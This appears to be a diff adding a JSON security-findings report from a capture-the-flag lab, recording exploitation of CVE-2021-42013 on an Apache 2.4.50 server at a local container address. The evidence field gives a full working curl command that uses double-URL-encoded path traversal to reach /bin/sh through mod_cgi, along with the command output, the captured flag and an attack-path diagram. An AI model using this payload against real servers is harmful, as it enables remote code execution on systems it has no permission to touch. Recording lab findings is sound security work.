@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:49:41.623383+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "f32f1c86-c43d-4720-a85c-00f099b2d36d",
+      "timestamp": "2026-04-12T21:49:41.623273+00:00",
+      "title": "CVE-2021-42013: Apache 2.4.50 Path Traversal + RCE via mod_cgi \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58759",
+      "description": "Apache 2.4.50 is vulnerable to CVE-2021-42013, an incomplete fix for CVE-2021-41773. The path traversal bypass uses double URL encoding: `%%32%65` decodes first to `%2e` then to `.`, allowing directory traversal past the cgi-bin alias. When mod_cgi is enabled, this leads to remote code execution as daemon (uid=2). The server exposes /bin/sh through 5 levels of traversal from /cgi-bin/.",
+      "evidence": "Exploit command:\ncurl --path-as-is -X POST 'http://172.17.0.1:58759/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; cat /FLAG.txt'\n\nRCE output (id): uid=2(daemon) gid=2(daemon) groups=1(bin),2(daemon),2(daemon),4(adm)\n\nFlag: flag{34bf3705-7f13-4540-b94f-273371c323f1}",
+      "tool_used": "curl (manual exploit)",
+      "cve": "CVE-2021-42013"
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "c469ff4c-a82c-4a65-9e27-2b11a2cc0918",
+      "timestamp": "2026-04-12T21:49:53.470362+00:00",
+      "title": "Apache 2.4.50 CVE-2021-42013 Attack Path",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] -->|\"POST /cgi-bin/.%%32%65/.../.%%32%65/bin/sh\"| Apache[\"Apache 2.4.50 :58759\"]\n  Apache -->|\"mod_cgi executes /bin/sh\"| Shell[\"Shell RCE as daemon uid=2\"]\n  Shell -->|\"cat /FLAG.txt\"| Flag[\"flag{34bf3705-7f13-4540-b94f-273371c323f1}\"]\n  Apache --- CVE[\"CVE-2021-42013\\nDouble URL encoding bypass\"]"
+    }
+  ]
+}
